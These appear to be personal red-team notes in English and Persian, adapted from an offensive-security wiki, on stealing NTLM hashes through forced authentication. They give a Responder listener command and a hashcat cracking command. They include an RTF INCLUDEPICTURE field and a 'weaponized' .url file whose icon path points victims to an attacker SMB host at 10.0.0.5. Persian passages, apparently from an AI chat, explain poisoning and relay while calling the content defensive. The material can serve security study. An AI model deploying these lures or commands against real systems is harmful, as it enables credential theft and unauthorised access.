

Credential Access, Stealing hashes

## 

[](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-hyperlink)

Execution via Hyperlink

Let's create a Word document that has a hyperlink to our attacking server where `responder` will be listening on port 445:


```
responder -I eth1
```

The retrieved hash can then be cracked offline with hashcat:

```
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```


## سوال : نقش Responder این وسط چیه 

وقتی مهاجم یک لینک یا reference به یک آدرس SMB (مثلاً `\\evil\share\payload.dotm`) داخل سند می‌گذارد، سیستم هدف ممکن است در تلاش برای دسترسی به آن آدرس، یک فرآیند شبکه‌ای راه بیاندازد که منجر به یکی از این مراحل شود:

1. سیستم هدف برای حل اسم یا پیدا کردن سرویس، یک کوئری LLMNR/NetBIOS/MDNS یا DNS می‌فرستد.
    
2. **Responder** روی شبکه گوش می‌دهد و به‌جای جواب‌دهندهٔ واقعی، خودش پاسخ می‌دهد و می‌گوید «آره من همون سرورم» (poisoning / spoofing).
    
3. کلاینت سپس به آدرسِ responder وصل می‌شود و معمولاً به‌صورت اتوماتیک یا با NTLM/SSPI سعی می‌کند authenticate کند (مثلاً برای دسترسی به share).
    
4. در همین تعامل، Responder می‌تواند:
    
    - هش NTLM کاربر یا کامپیوتر را ضبط کند (credential capture), یا
        
    - خودش پاسخ‌دهی کند و فایل مخرب/قابل دانلود را از طریق SMB/HTTP سرو کند (serve payload), یا
        
    - آن هش را به‌صورت relay به یک سرویس دیگر بفرستد (در تکنیک NTLM relay) تا دسترسی مستقیم بگیرد.
        

نتیجهٔ عملی برای مهاجم: یا فایل مخرب مستقیم به‌وسیله SMB از responder/attacker دانلود می‌شود، یا مهاجم یک هش یا session به‌دست می‌آورد که بعدها برای دسترسی استفاده می‌شود.

---

## Execution via .RTF

## `.rtf` چیه؟ (یک‌خطی)

`.rtf`
مخفف **Rich Text Format**، فرمت متنی‌ایه که توسط مایکروسافت طراحی شده برای جا‌به‌جایی متن قالب‌بندی‌شده بین برنامه‌ها و پلتفرم‌ها.

---

## چه چیزهایی پشتیبانی می‌کنه

- قالب‌بندی پایه: فونت، اندازه، ضخیم/کج، رنگ، پاراگراف، تراز، bullets/numbering.
    
- استایل‌های ساده و section/page settings.
    
- امکان قرار دادن تصاویر (embedded یا linked) و اشیاء OLE (در برخی پیاده‌سازی‌ها).
    
- متن به‌صورت «نسبتاً خوانا» (برخلاف فرمت‌های باینری قدیمی).
    

---

## مزایا / چرا ازش استفاده می‌کنند

- **قابل‌حمل و ساده:** بین Word، WordPad، LibreOffice، … قابل باز و ویرایش است.
    
- **رابط بین برنامه‌ها:** برای انتقال متن با فرمتی ساده بین اپلیکیشن‌های مختلف مفیده.
    
- **خواندن با ادیتور متن:** اگرچه کدهای RTF دیده می‌شن، اما محتوا هنوز قابل خواندنه—مناسب برای debugging یا اتوماسیون.
    
- **پشتیبانی قدیمی و گسترده:** از نسخه‌های قدیمی آفیس تا برنامه‌های امروزی.



آفرین — خیلی خوب سؤال کردی. می‌رم سراغ توضیحِ ساده، دقیق و عملی (دفاعی) دربارهٔ این RTF و مرحلهٔ «شروع listenerِ احراز هویت» روی ماشین مهاجم — همهٔ توضیحات صرفاً برای دفاع/آنالیز هستند، نه آموزش حمله.

---

## ۱) چی در `file.rtf` نوشته شده و معنیش چیه

این قطعه RTF:

```
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://10.0.0.5/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```

معنی‌اش به زبان ساده: یک فیلد `INCLUDEPICTURE` درون فایل RTF وجود دارد که می‌گوید «یک تصویر از آدرس `file://10.0.0.5/test.jpg` را درون سند وارد کن».  
نکتهٔ کلیدی: `file://` وقتی در برنامه‌هایی مثل Word پردازش می‌شود می‌تواند باعث شود اپلیکیشن تلاش کند آن منبع را از **شبکه** بارگیری کند — و در سیستم ویندوز وقتی آدرسِ شبکه به شکل UNC/SMB یا شبیه آن باشد، سیستم ممکن است برای دسترسی به آن آدرس **یک احراز هویت خودکار (NTLM/SSPI)** انجام دهد.

---

## ۲) چه اتفاقی در سمت مقصد (کسی که فایل را باز می‌کند) می‌افتد

1. کاربر فایل RTF را با Word/WordPad باز می‌کند.
    
2. Word به خاطر فیلد `INCLUDEPICTURE` تلاش می‌کند تصویر را بارگیری کند. چون URL با `file://10.0.0.5/...` شروع شده، سیستم تبدیل/resolve می‌کند و احتمالاً سعی می‌شود یک اتصال SMB/TCP به `10.0.0.5` برقرار شود (یا اگر URL به http باشد، HTTP request انجام شود).
    
3. ویندوز معمولاً برای اتصال به share یا منبع شبکه پروسهٔ احراز هویت را خودکار انجام می‌دهد — یعنی سیستم مقصد (کلاینت) ممکن است بدون دخالت کاربر یک NTLM challenge-response شروع کند و credential hash را به سرور ارائه کند.
    
4. اگر روی آدرس گوش‌دهنده‌ای مثل Responder یا SMB server مخرب وجود داشته باشد، مهاجم می‌تواند هش NTLM کاربر/کامپیوتر را ضبط کند یا از تکنیک‌های relay استفاده کند.
    
5. علاوه‌بر capture، اگر سرور مهاجم فایل test.jpg را واقعاً سرو کند، Word تصویر را در سند نشان می‌دهد — این خود یک vector اجتماعی برای ترغیب کاربر است.
    

---

## ۳) منظور از «Starting authentication listener on the attacking system»

این جمله یعنی: مهاجم قبل از فرستادن RTF یک سرویس/ابزار روی IP `10.0.0.5` اجرا می‌کند که:

- به درخواست‌های SMB/NetBIOS/HTTP گوش می‌دهد،
    
- و هر زمان یک مشتری (کلاینت) تلاش کرد به آن متصل شود، پاسخ‌هایی می‌دهد تا **احراز هویت NTLM** یا session را دریافت یا capture کند.  
    ابزارهای شناخته‌شده برای این کار در تست نفوذ/Red Team و نیز توسط مهاجمان: **Responder**, **impacket smbserver**, **metasploit auxiliary smb server** و امثال آن — که می‌توانند پکت‌ها را پاسخ دهند و هش‌ها را لاگ کنند یا payload سرو کنند. (این نام‌ها فقط برای آگاهی دفاعی آورده شده.)
    


---


## Execution via .URL

Create a weaponized .url file and upload it to the victim system:

c:\link.url@victim

```
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.0.0.5\%USERNAME%.icon
IconIndex=1
```

Create a listener on the attacking system:


```
responder -I eth1 -v
```

Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-LNBag_nxT92_UEIeHF6%252F-LNBbbi9QbPgnEV975AY%252Fforced-authentication-url.gif%3Falt%3Dmedia%26token%3D86743379-a2f6-4353-ae1b-f008bd065163&width=768&dpr=4&quality=100&sign=f75ae21a&sv=2)
